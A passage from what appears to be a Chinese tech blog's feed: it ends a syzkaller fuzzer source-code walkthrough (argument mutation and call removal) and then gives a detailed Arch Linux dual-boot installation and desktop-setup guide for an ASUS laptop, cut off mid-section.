p.Target&#125;<br>ForeachArg(c, ma.collectArg)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(ma.args) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>s := analyze(ctx.ct, ctx.corpus, p, c)<br>arg, argCtx := ma.chooseArg(r.Rand)<br>calls, ok1 := p.Target.mutateArg(r, s, arg, argCtx, &amp;updateSizes)<br><span class="hljs-keyword">if</span> !ok1 &#123;<br>ok = <span class="hljs-literal">false</span><br><span class="hljs-keyword">continue</span><br>&#125;<br>p.insertBefore(c, calls)<br>idx += <span class="hljs-built_in">len</span>(calls)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">len</span>(p.Calls) &gt; ctx.ncalls &#123;<br>idx--<br>p.RemoveCall(idx)<br>&#125;<br><span class="hljs-keyword">if</span> idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-built_in">len</span>(p.Calls) || p.Calls[idx] != c &#123;<br><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">&quot;wrong call index: idx=%v calls=%v p.Calls=%v ncalls=%v&quot;</span>,<br>idx, <span class="hljs-built_in">len</span>(calls), <span class="hljs-built_in">len</span>(p.Calls), ctx.ncalls))<br>&#125;<br><span class="hljs-keyword">if</span> updateSizes &#123;<br>p.Target.assignSizesCall(c)<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="mutator-removeCall-：随机移除程序中的一个系统调用"><a href="#mutator-removeCall-：随机移除程序中的一个系统调用" class="headerlink" title="mutator.removeCall()：随机移除程序中的一个系统调用"></a>mutator.removeCall()：随机移除程序中的一个系统调用</h4><p>该函数也比较简短，主要就是随机移除程序中的一个系统调用，如果程序中没有系统调用则不会进行移除操作：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *mutator)</span></span> removeCall() <span class="hljs-type">bool</span> &#123;<br>p, r := ctx.p, ctx.r<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(p.Calls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>idx := r.Intn(<span class="hljs-built_in">len</span>(p.Calls))<br>p.RemoveCall(idx)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br></code></pre></td></tr></table></figure><p>至此，syz-fuzzer 主体源码逻辑分析完毕</p><blockquote><p>简单总结的话，笔者感觉其实主要都是偏工程性的东西比较多🤔</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;（摘下眼镜）Furry？（戴上眼镜）Fuzzer！&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/categories/FUZZ/"/>
    
    
    <category term="漏洞挖掘" scheme="https://arttnba3.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="syzkaller" scheme="https://arttnba3.github.io/tags/syzkaller/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>【DISTRO.0x00】从零开始的 Arch Linux 生活</title>
    <link href="https://arttnba3.github.io/2023/09/25/DISTRO-0X00-INSTALL_ARCH_WINDOWS/"/>
    <id>https://arttnba3.github.io/2023/09/25/DISTRO-0X00-INSTALL_ARCH_WINDOWS/</id>
    <published>2023-09-24T15:25:17.000Z</published>
    <updated>2023-11-23T15:40:29.819Z</updated>
    
    <content type="html"><![CDATA[<p>不好用，在安装界面睡了三个小时</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>本科阶段笔者一直用的 Windows 作为主力系统并使用 VMWare Workstation 运行 Linux 虚拟机，但总感觉不够得劲，可惜笔者有一些硬性需求只能在 Windows 上完成（比如说游戏、绘图等），由于仅有一台电脑的缘故，所以一直没有机会在真机上安装 Linux 操作系统 ：(</p><p>开始读 Phd 之后老板比较阔气大手一挥直接配了一个新的笔记本用来工作，于是笔者决定这一次直接在真机上安装 Linux ，专门用来做工作上的事情</p><p>关于发行版的选择，笔者决定选择安装 <a href="https://archlinux.org/">Arch Linux</a>，因为其有着较为完备的各类文档及驱动适配等，同时笔者的新笔记本的牌子为华硕，其同样有一个较为完善的<a href="https://asus-linux.org/">第三方社区</a>支持</p><p>不过考虑到有些工作可能还是在 Windows 上做会比较方便（例如调试 Windows 程序），再加上原装的 Windows 系统毕竟是收了笔者的钱的，直接抹掉的话未免有点可惜（笑），所以笔者最终的策略是<strong>安装 Windows + Linux 双系统，日常主力还是使用 Linux 系统</strong></p><h1 id="0x01-安装前的准备工作"><a href="#0x01-安装前的准备工作" class="headerlink" title="0x01. 安装前的准备工作"></a>0x01. 安装前的准备工作</h1><h3 id="制作-Arch-Linux-物理安装媒介"><a href="#制作-Arch-Linux-物理安装媒介" class="headerlink" title="制作 Arch Linux 物理安装媒介"></a>制作 Arch Linux 物理安装媒介</h3><p>首先在 <a href="https://archlinux.org/download/">https://archlinux.org/download/</a> 下载最新的 Arch Linux 镜像，这里提供了几个镜像站，可以直接选离你最近的那一个：）</p><p>完成镜像下载之后直接烧录到 U 盘上即可，这里笔者用的是 <a href="https://etcher.balena.io/">balenaEtcher</a> ：</p><p><img src="https://s2.loli.net/2023/09/18/5lqvTSMEXz4xmQr.png"></p><h3 id="关闭-Secure-Boot"><a href="#关闭-Secure-Boot" class="headerlink" title="关闭 Secure Boot"></a>关闭 Secure Boot</h3><p>由于 Arch Linux 的安装媒介暂不支持安全启动，因此这里我们需要将电脑的这个特性暂且关闭</p><p>华硕笔记本进入 BIOS 的方法为：首先摁住 <code>F2</code>，然后按一下开机键，一直到 BIOS 界面出现后松开 <code>F2</code> 即可</p><p>点击 <code>进阶设置→安全性</code>，把 <code>安全启动控制</code> 改为 <code>关闭</code> 即可：</p><p><img src="https://s2.loli.net/2023/09/18/wsMylQKgk9XA4WR.jpg" alt="关闭安全启动"></p><h3 id="分配-Linux-磁盘空间"><a href="#分配-Linux-磁盘空间" class="headerlink" title="分配 Linux 磁盘空间"></a>分配 Linux 磁盘空间</h3><p>直接右键 <code>我的电脑→显示更多选项→管理→磁盘管理</code> 拉一块空的区域出来就行：</p><p><img src="https://s2.loli.net/2023/09/18/tn92KjiBeLA7Zv8.jpg"></p><h1 id="0x02-安装-Arch-Linux"><a href="#0x02-安装-Arch-Linux" class="headerlink" title="0x02. 安装 Arch Linux"></a>0x02. 安装 Arch Linux</h1><blockquote><p>主要还是参照<a href="https://wiki.archlinux.org/title/installation_guide">官方文档</a>来弄</p></blockquote><h3 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h3><p>首先还是进 BIOS 改启动顺序把安装介质调到第一位：</p><p><img src="https://s2.loli.net/2023/09/18/dTlZOjgPWbvE18z.png"></p><p>然后就来到了 <code>GRUB</code>，正常情况下直接选第一个就行：</p><p><img src="https://s2.loli.net/2023/09/18/og6ebnwTvEcGkHs.jpg"></p><p>如果你需要使用无线网络，可以输入如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">iwctl       <span class="hljs-comment"># 进入无线网络控制界面</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">device list <span class="hljs-comment"># 查看无线网卡信息</span></span><br></code></pre></td></tr></table></figure><p>笔者这里显示的网卡设备名是 <code>wlan0</code> ，接下来输入如下命令扫描附近的的无线网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 scan <span class="hljs-comment"># 扫描</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 get-networks <span class="hljs-comment"># 显示结果</span></span><br></code></pre></td></tr></table></figure><p>接下来使用 <code>connect</code> 参数进行连接，例如这里假设网络名为 <code>BeastSenbei</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">station wlan0 connect BeastSenbei <span class="hljs-comment"># 如果有密码则会要求你输入</span></span><br></code></pre></td></tr></table></figure><p>之后直接输入 <code>exit</code> 即可退出该界面</p><blockquote><p>你可以使用 <code>pacman -Syyy</code> 命令测试网络是否联通，若要换源则直接编辑 <code>/etc/pacman.d/mirrorlist</code> 文件即可</p></blockquote><h3 id="建立磁盘分区"><a href="#建立磁盘分区" class="headerlink" title="建立磁盘分区"></a>建立磁盘分区</h3><p>首先使用 <code>lsblk</code> 查看磁盘分区，这里看不到我们之前新划分的区域，因为还没划分一个新的分区：</p><p><img src="https://s2.loli.net/2023/09/18/ram95FjtBEIuD7p.jpg"></p><p>接下来我们使用如下命令进行新分区的建立，注意根据你自己的磁盘设备名进行输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">cfdisk /dev/nvme0n1</span><br></code></pre></td></tr></table></figure><p>可以看到一个 <code>Free Space</code>，选中并选择 <code>[New]</code> 即可，默认直接敲两下回车就是用所有的空间，你也可以选择手动输入自己想要划分的分区大小，完成之后在下面选择 <code>[Write]</code> 然后输入 <code>yes</code> 即可：</p><p><img src="https://s2.loli.net/2023/09/18/EX81wkHmfjbWMF6.jpg"></p><p>接下来将该分区格式化为 <code>ext4</code> 格式，这里注意分区别选错了，不记得的就重新再看看 <code>lsblk</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mkfs.ext4 /dev/nvme0n1p6</span><br></code></pre></td></tr></table></figure><h3 id="正式安装"><a href="#正式安装" class="headerlink" title="正式安装"></a>正式安装</h3><p>接下来首先挂载新分区，之后在内部创建 <code>/boot</code> 目录，并将 Windows 原有的 EFI 分区挂载到 <code>/boot</code> 目录下，这里注意看自己对应的分区名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">mount /dev/nvme0n1p6 /mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> /mnt/boot</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">mount /dev/nvme0n1p1 /mnt/boot</span><br></code></pre></td></tr></table></figure><p>接下来使用该命令进行安装基本的环境，这里笔者安装默认的内核版本 <code>linux</code>，你也可以在 <a href="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8">Wiki</a> 上选择自己想要的内核（比如说带有安全加固的 <code>linux-hardened</code>）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacstrap /mnt base linux linux-firmware</span><br></code></pre></td></tr></table></figure><p>安装完成之后接下来我们来对系统进行一些基本配置，首先是生成 fstab（文件系统表）文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab</span><br></code></pre></td></tr></table></figure><p>接下来使用 <code>arch-chroot</code> 命令切换到新的系统环境中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">arch-chroot /mnt</span><br></code></pre></td></tr></table></figure><p>然后是设置时区，笔者现在在墨尔本所以时区设置为墨尔本，如果你在中国大陆则需要设置为 <code>Asia/Shanghai</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Australia/Melbourne /etc/localtime</span><br></code></pre></td></tr></table></figure><p>接下来生成 <code>/etc/adjtime</code> 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">hwclock --systohc</span><br></code></pre></td></tr></table></figure><p>然后创建主机名，这里就随便了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3-Arch&quot;</span> &gt; /etc/hostname</span><br></code></pre></td></tr></table></figure><p>在 <code>/etc/hosts</code> 中写入如下内容，这里注意改成自己的 hostname：</p><p><img src="https://s2.loli.net/2023/09/18/hdjHysTvP8KlqA4.png"></p><p>设置 root 密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">passwd</span><br></code></pre></td></tr></table></figure><p>安装一些基本的软件包，这里我们选择使用 <code>grub</code> 作为启动器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S grub efibootmgr networkmanager network-manager-applet dialog wireless_tools wpa_supplicant os-prober mtools dosfstools ntfs-3g base-devel linux-headers reflector git sudo vim</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S intel-ucode <span class="hljs-comment"># 如果你是 AMD 则需要改成 amd-ucode</span></span><br></code></pre></td></tr></table></figure><p>配置 GRUB 自动启用 <code>os-prober</code>，这里只需要在 <code>/etc/default/grub</code> 中加入一行 <code>GRUB_DISABLE_OS_PROBER=false</code> ，并输入如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Arch</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg</span><br></code></pre></td></tr></table></figure><p>到这一步一个基本的 Arch 环境就安装好了，完成之后输入如下命令进行重启进入系统，别忘了拔出移动安装介质：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">exit</span>        <span class="hljs-comment"># 退出 arch-chroot</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">umount -a   <span class="hljs-comment"># 取消分区挂载</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">reboot      <span class="hljs-comment"># 重启</span></span><br></code></pre></td></tr></table></figure><blockquote><p>后面如果想再进入 Windows 只需要进 BIOS 调整启动顺序即可</p></blockquote><h1 id="0x03-常规系统配置"><a href="#0x03-常规系统配置" class="headerlink" title="0x03. 常规系统配置"></a>0x03. 常规系统配置</h1><p>接下来是一些常规系统配置，包括新建用户、配置 GUI 等</p><h3 id="启动网络"><a href="#启动网络" class="headerlink" title="启动网络"></a>启动网络</h3><p>通过如下命令启动网络并连接 WiFi：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> --now NetworkManager</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nmtui</span><br></code></pre></td></tr></table></figure><p>进入这个界面后选 <code>Activate a connection</code>，然后就正常选 WiFi 输密码连接就行，这个只用最开始的时候弄一次：</p><p><img src="https://s2.loli.net/2023/09/18/34f1eJYGojnX2xq.jpg"></p><p>DHCP 相关的一些配置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S dhcpcd</span><br></code></pre></td></tr></table></figure><h3 id="bash-自动补全"><a href="#bash-自动补全" class="headerlink" title="bash 自动补全"></a>bash 自动补全</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S bash-completion</span><br></code></pre></td></tr></table></figure><h3 id="设置-Locale-进行本地化"><a href="#设置-Locale-进行本地化" class="headerlink" title="设置 Locale 进行本地化"></a>设置 Locale 进行本地化</h3><p>去掉 <code>/etc/locale.gen</code> 中 <code>en_US.UTF-8</code> 所在行以及 <code>zh_CN.UTF-8</code> 所在行开头的 <code>#</code>，然后在 <code>/etc/locale.conf</code> 中写入一行 <code>LANG=en_US.UTF-8</code> 即可</p><h3 id="创建新用户"><a href="#创建新用户" class="headerlink" title="创建新用户"></a>创建新用户</h3><p>没啥好说的，老一套东西，这里别忘了改成自己的用户名：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">groupadd arttnba3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">useradd -m -s /bin/bash -g arttnba3 arttnba3</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">passwd arttnba3</span><br></code></pre></td></tr></table></figure><p>授予 sudo 权限，这里注意我们<strong>应当且仅应当使用 visudo，而非直接编辑 &#x2F;etc&#x2F;sudoers 文件</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">usermod -aG wheel arttnba3 <span class="hljs-comment"># arch 下的 sudo 组</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">EDITOR=vim visudo</span><br></code></pre></td></tr></table></figure><p>去掉如下图所示这一行的前面的 <code>#</code> 注释即可，笔者这里是已经修改过后的版本：</p><p><img src="https://s2.loli.net/2023/09/18/dpNtu5qs4hCGSmD.png"></p><h3 id="配置桌面环境"><a href="#配置桌面环境" class="headerlink" title="配置桌面环境"></a>配置桌面环境</h3><p>笔者选择安装 <code>XWayland + KDE Plasma</code>，首先安装基本的 KDE Plasma 桌面组件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S plasma-meta konsole dolphin</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> sddm</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S egl-wayland kde-applications-meta sway alacritty waybar wofi xorg-xwayland xorg-xlsclients qt5-wayland glfw-wayland</span><br></code></pre></td></tr></table></figure><blockquote><p>这里会有一些不同的 provider 供选择，按自己喜欢的选就好：</p><p><img src="https://s2.loli.net/2023/09/19/XRjHPuoTIzFxUdB.png"></p><p>需要注意的是 KDE <a href="https://community.kde.org/Distributions/Packaging_Recommendations#Non-Plasma_packages">仅推荐VLC后端</a>，因为GStreamer<a href="https://invent.kde.org/libraries/phonon-gstreamer/-/issues/1">不再维护</a>：</p></blockquote><p>之后重启就能进图形化的桌面了，说实话有点丑 ：(</p><p><img src="https://s2.loli.net/2023/09/19/W1q4dgVSibDeF2t.jpg"></p><p>配置默认开启小键盘只需要在 <code>/etc/sddm.conf</code> 文件中添加如下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">[General]<br>Numlock=on<br></code></pre></td></tr></table></figure><h3 id="开启-32-位支持库"><a href="#开启-32-位支持库" class="headerlink" title="开启 32 位支持库"></a>开启 32 位支持库</h3><p>将 <code>/etc/pacman.conf</code> 中 <code>[multilib]</code> 所在的那两行开头的 <code>#</code>去掉，然后 <code>pacman -Syyu</code> 即可</p><h3 id="更换包管理器为-AUR"><a href="#更换包管理器为-AUR" class="headerlink" title="更换包管理器为 AUR"></a>更换包管理器为 AUR</h3><p>照着文档做就行，这里笔者就懒得自己编译了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">pacman -S --needed git base-devel</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://aur.archlinux.org/yay-bin.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> yay-bin</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">makepkg -si</span><br></code></pre></td></tr></table></figure><h3 id="禁用-iwd"><a href="#禁用-iwd" class="headerlink" title="禁用 iwd"></a>禁用 iwd</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">disable</span> iwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl stop iwd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now NetworkManager</span><br></code></pre></td></tr></table></figure><h3 id="基础功能包与中文字体安装"><a href="#基础功能包与中文字体安装" class="headerlink" title="基础功能包与中文字体安装"></a>基础功能包与中文字体安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S sof-firmware alsa-firmware alsa-ucm-conf          <span class="hljs-comment"># 一些可能需要的声音固件</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S adobe-source-han-serif-cn-fonts wqy-zenhei        <span class="hljs-comment"># 开源中文字体</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S noto-fonts-cjk noto-fonts-emoji noto-fonts-extra  <span class="hljs-comment"># 谷歌开源字体及表情</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S ark</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S p7zip unrar unarchiver lzop lrzip                 <span class="hljs-comment"># ark 的可选依赖</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S google-chrome</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S packagekit-qt5 packagekit appstream-qt appstream gwenview wget kate <span class="hljs-built_in">bind</span> <span class="hljs-comment"># 图片查看器和其他工具等</span></span><br></code></pre></td></tr></table></figure><h3 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h3><p>笔者用的 fcitx：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-im</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-chinese-addons <span class="hljs-comment"># 中文输入引擎</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S fcitx5-pinyin-zhwiki  <span class="hljs-comment"># 中文维基百科词库</span></span><br></code></pre></td></tr></table></figure><p>之后使用 <code>EDITOR=vim sudoedit /etc/environment</code> 命令在对应文件中添加如下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">GTK_IM_MODULE=fcitx<br>QT_IM_MODULE=fcitx<br>XMODIFIERS=@im=fcitx<br>SDL_IM_MODULE=fcitx<br></code></pre></td></tr></table></figure><p>之后在系统设置里便可进行相应的配置</p><h3 id="启用蓝牙并安装蓝牙音频设备"><a href="#启用蓝牙并安装蓝牙音频设备" class="headerlink" title="启用蓝牙并安装蓝牙音频设备"></a>启用蓝牙并安装蓝牙音频设备</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S bluez bluez-utils</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now bluetooth</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S pulseaudio-bluetooth</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">pulseaudio -k</span><br></code></pre></td></tr></table></figure><h3 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h3><p>首先安装 Intel 核显驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S mesa lib32-mesa vulkan-intel lib32-vulkan-intel</span><br></code></pre></td></tr></table></figure><p>如果你和笔者一样还有一张 N 卡则使用如下命令安装驱动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S nvidia nvidia-settings lib32-nvidia-utils</span><br></code></pre></td></tr></table></figure><blockquote><p>这里笔者没有安装 <code>optimus-manager</code>， 因为一安就进不去桌面了，看了半天日志找了半天解决方案都没能解决（悲）</p><p>因为目前对续航其实没有过于极限的要求，独显集显混合输出的情况下还是能轻度工作3h左右的，因此暂时不考虑继续整这玩意了：）</p></blockquote><h1 id="0x04-桌面美化"><a href="#0x04-桌面美化" class="headerlink" title="0x04. 桌面美化"></a>0x04. 桌面美化</h1><h3 id="启动界面美化"><a href="#启动界面美化" class="headerlink" title="启动界面美化"></a>启动界面美化</h3><p>直接在 <code>System Settings-&gt;Startup and Shutdown-&gt;Login Screen(SDDM)</code> 里就能改，笔者这里直接选了 <code>Breeze</code></p><h3 id="桌面风格美化"><a href="#桌面风格美化" class="headerlink" title="桌面风格美化"></a>桌面风格美化</h3><p>直接在 <code>System Settings-&gt;Appearance-&gt;Global Theme</code> 里选择自己喜欢的主题安装上然后再 apply 就行，或者也可以自己去 <a href="https://store.kde.org/">https://store.kde.org</a> 进行下载，笔者选择的是国人设计师 <a href="https://github.com/vinceliuice">vinceliuice</a> 开发的 <a href="https://github.com/vinceliuice/MacVentura-kde">MacVentura KDE theme</a> 主题</p><h3 id="安装-Dock"><a href="#安装-Dock" class="headerlink" title="安装 Dock"></a>安装 Dock</h3><p>在底下有个 Mac 样式的 Dock 还是相对来说比较养眼一些，这里笔者安装的是 <code>latte-dock</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">yay -S latte-dock</span><br></code></pre></td></tr></table></figure><p>然后 <code>alt + f2</code> 输入 <code>latte</code> 就 ok 了</p><p>最后再摆放各种 widgets 调一调 panel 位置啥的差不多就 ok 了，整体效果如下：</p><p><img src="https://s2.loli.net/2023/09/20/3bdIi6KA9c2ulNV.png"></p><h1 id="0x05-一些报错的解决"><a href="#0x05-一些报错的解决" class="headerlink" title="0x05. 一些报错的解决"></a>0x05. 一些报错的解决</h1><h3 id="pcieport-报错"><a href="#pcieport-报错" class="headerlink" title="pcieport 报错"></a>pcieport 报错</h3><p>启动起来发现内核莫名其妙吐了一大堆的奇怪的东西：</p><p><img src="https://s2.loli.net/2023/09/18/m71oVX2g489Or5s.jpg"></p><p>在 <code>/boot/grub/grub.cfg</code> 中找到内核启动参数，添加上 <code>pci=nommconf</code> 即可</p><h3 id="chrome-无法播放视频"><a href="#chrome-无法播放视频" class="headerlink" title="chrome 无法播放视频"></a>chrome 无法播放视频</h3><p>就一直卡在加载界面不动，参见 <a 